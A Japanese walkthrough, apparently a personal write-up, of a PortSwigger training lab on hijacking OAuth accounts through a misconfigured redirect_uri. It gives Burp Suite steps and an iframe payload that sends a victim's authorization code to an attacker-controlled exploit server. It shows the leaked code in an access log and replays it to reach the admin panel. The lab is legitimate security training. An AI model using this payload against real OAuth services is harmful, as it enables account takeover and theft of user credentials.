# redirect_uri を介した OAuth アカウントのハイジャック

次のハッキングラボを実施します  
https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri  
このラボでは、OAuth サービスを使用して、ユーザーがソーシャル メディア アカウントでログインできるようにします。OAuth プロバイダーの構成を誤ると、攻撃者が他のユーザーのアカウントに関連付けられた認証コードを盗むことが可能になります。

- 1. BurpSuite を起動して、Proxy タブからブラウザを立ち上げます
- 2. ブラウザからハッキングラボにアクセスします
- 3. 一般ユーザーで OAith ログインします
- 4. ログアウトします
- 5. 再度ログインします
- 6. GET /auth?client_id=XXX&redirect_uri=YYY リクエストを send to repeater します
- 7. redirect_url を任意の値に書き換えて送信するとリクエストが正常に処理されます
- 8. エクスプロイトサーバに移動します
- 9. ボディに次の形式で記載します

```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

- 10. GET /oauth-callback?code=XXX リクエストを send to repeater します
- 11. 手順 7 のリクエストを右クリックして Copy URL を選択し、エクスプロイトサーバのボディ部にあてはめていきます

```
https://exploit-0a2e009c043dc3b3837ebea901c500fb
```

- 12. Store ボタン押下後、 Deliver expolit to victim ボタン押下
- 13. Access log を見ると、victim からのアクセスログがあります

```
10.0.4.195      2023-08-21 14:02:27 +0000 "GET /?code=kLcp-1zIifAsDrV_Sq1zo2HzJoF5RWgcsiuUFraly2q HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
```

- 14. 手順 10 のリクエストのコードを Access log のものに入れ替えてリクエスト送信します
- 15. Response を右クリックして、Show Response in browser を選択します
- 16. 管理者ページが表示されるので一般ユーザーを削除します
